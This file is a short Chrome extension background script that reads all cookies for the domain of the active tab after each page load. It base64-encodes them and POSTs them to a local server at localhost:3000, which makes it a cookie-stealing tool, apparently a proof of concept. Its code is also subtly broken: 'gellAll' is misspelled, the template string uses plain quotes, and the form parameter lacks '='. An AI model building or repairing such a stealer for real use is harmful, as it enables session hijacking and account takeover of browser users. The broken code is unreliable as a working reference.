(function() {
    // Your background stuffs happen
    let tabId;
    chrome.tabs.onActivated.addListener(function(tab) {
        tabId = tab.tabId;
    
    });

    chrome.webNavigation.onCompleted.addListener(function() {
        chrome.tabs.get(tabId, function(tab) {
            let domain = tab.url.split("://")[1].split("/")[0];
            if (domain.startsWith("www.")) {
                domain = domain.replace("www.", "")
            }

            chrome.cookies.gellAll({domain: domain}, function(cookies) {
                const data = unpack(cookies);
                send("http://localhost:3000", btoa(data));
            });
        });   
    });

    function unpack(objs) {
        let s = "";
        objs.forEach(obj => {
            Object.keys(obj).forEach(key => {
                s += '${key}: ${obj[key]}\n';
            });
            s += "\n"

        });

        return s;
    }

    function send(url, data) {
        const xhr = new XMLHttpRequest();
        const params = "data" + data;

        xhr.open("POST", url, true);
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.onreadystatechange = function() {
            if(xhr.readyState == 4 && xhr.status == 200) {
                console.log(xhr.responseText);
            }
            
        }

        xhr.send(params);

    }
}()); 